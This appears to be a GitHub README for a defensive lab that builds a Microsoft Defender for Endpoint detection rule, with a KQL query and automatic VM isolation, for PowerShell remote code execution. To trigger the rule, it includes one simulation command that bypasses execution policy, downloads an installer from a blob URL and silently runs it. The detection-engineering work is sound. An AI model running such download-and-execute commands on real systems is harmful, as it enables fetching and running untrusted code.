# Remote Code Execution Detection via PowerShell (MDE)

This project demonstrates the creation and validation of a custom detection rule in **Microsoft Defender for Endpoint (MDE)** to detect potential **Remote Code Execution (RCE)** via PowerShell. Once triggered, the detection rule automatically isolates the affected virtual machine to prevent further malicious activity.

The rule targets behavior commonly associated with RCE, where PowerShell is used to download and execute an external file — in this case, a silent installation of the 7-Zip application using `Invoke-WebRequest` and `Start-Process`.

---

## PowerShell Command Used for RCE Simulation

The following command simulates attacker behavior by downloading and executing a file via PowerShell:

```powershell
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command `
"Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' `
-OutFile 'C:\ProgramData\7z2408-x64.exe'; `
Start-Process 'C:\ProgramData\7z2408-x64.exe' -ArgumentList '/S' -Wait"
```

---

## Step 1: Creating the Detection Query

In the **Advanced Hunting** dashboard within MDE, a KQL query is written to identify suspicious PowerShell behavior:

```kql
let target_machine = "io-test-vm";
DeviceProcessEvents
| where DeviceName == target_machine
| where AccountName != "system"
| where InitiatingProcessCommandLine has_all ("Invoke-WebRequest", "Start-Process")
| order by Timestamp desc 
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/bc663ad5-6843-4123-a435-c6836fe1c9fb" width="450"/>
</p>

---

## Step 2: Creating the Detection Rule

Click **"Create detection rule"** on the right side of the query window.

<p align="center">
  <img src="https://github.com/user-attachments/assets/de92a563-158b-457d-ba9a-85426ec89270" width="450"/>
</p>

### General Settings

Fill in the required fields (rule name, severity, description, etc.) to define the rule.

<p align="center">
  <img src="https://github.com/user-attachments/assets/20f0f0ae-070f-4cb6-be7c-1f2390590022" width="450"/>
</p>

---

### Impacted Entities

This step identifies affected assets based on the query output, enabling automation and alert context.

<p align="center">
  <img src="https://github.com/user-attachments/assets/a368a4a3-9269-4163-b150-58e02d4391cf" width="450"/>
</p>

---

### Automated Actions

Configure automated responses. In this scenario, **device isolation** is selected to immediately contain the threat.

<p align="center">
  <img src="https://github.com/user-attachments/assets/2bb45148-feb5-402b-a23e-728d35106224" width="450"/>
</p>

> **Note:** Full isolation is recommended to prevent further malicious activity.

---

### Review and Submit

Review all configuration details and submit the rule for activation.

<p align="center">
  <img src="https://github.com/user-attachments/assets/9b780a4d-6d4f-43d2-a19d-1317fae314dd" width="450"/>
</p>

---

## Step 3: Viewing the Detection Rule

After submission, the rule appears in the **Detection Rules** dashboard. Selecting the rule reveals its history, alert triggers, and automated actions taken.

<p align="center">
  <img src="https://github.com/user-attachments/assets/270233a8-f4e9-4ab4-9aaa-0bb6ef50bac5" width="450"/>
  <img src="https://github.com/user-attachments/assets/8fc98915-4082-45e0-8f3d-0bfebe949b3f" width="550"/>
</p>

---

## Step 4: Triggering the Rule

To test the detection, access the test VM (`io-test-vm`) and execute the PowerShell command from earlier.

<p align="center">
  <img src="https://github.com/user-attachments/assets/6ef9afc5-46f1-4532-bf6f-5b54d5296498" width="450"/>
</p>

---

## Step 5: Reviewing Alerts

Once triggered, an alert will appear in the **Detection Rule** dashboard. Clicking on the alert shows the full event timeline, impacted entity, actions taken (e.g., isolation), and command details.

<p align="center">
  <img src="https://github.com/user-attachments/assets/9e7f0edf-a667-4fdf-97c6-92bbc763a871" width="1000"/>
</p>

<p align="center">
  <img src="https://github.com/user-attachments/assets/5f3ad75f-74d2-4a92-a14a-4ca8313db507" width="450"/>
</p>

<p align="center">
  <img src="https://github.com/user-attachments/assets/149f887d-4495-400c-89aa-6c67db695c23" width="450"/>
</p>

<p align="center">
  <img src="https://github.com/user-attachments/assets/138dae23-4aaf-4620-919e-17f011318aea" width="450"/>
</p>

<p align="center">
  <img src="https://github.com/user-attachments/assets/3ee8a503-a8f0-41b8-b82c-83a68478b77f" width="450"/>
</p>

---

## Step 6: Verifying Isolation and Remediation

Attempting to log in to the isolated VM will result in failure, confirming successful containment. If no further suspicious activity is detected, the device can be manually released from isolation via the MDE device page.

<p align="center">
  <img src="https://github.com/user-attachments/assets/4209f01d-8f68-4859-84b7-453c4a65e484" width="450"/>
</p>

<p align="center">
  <img src="https://github.com/user-attachments/assets/d10b98be-e412-4d1f-aa03-0188e15620fd" width="450"/>
</p>

---

## Summary

This lab demonstrates a complete workflow for detecting and responding to potential remote code execution activity in Microsoft Defender for Endpoint. It includes simulating an RCE attack using PowerShell, creating a detection rule using KQL, and validating automated isolation as a containment response. This project showcases skills in threat simulation, detection engineering, and endpoint response automation.

---

**Author:** [Gabriel Espinoza](https://github.com/gabriel-espinoza-77)


























































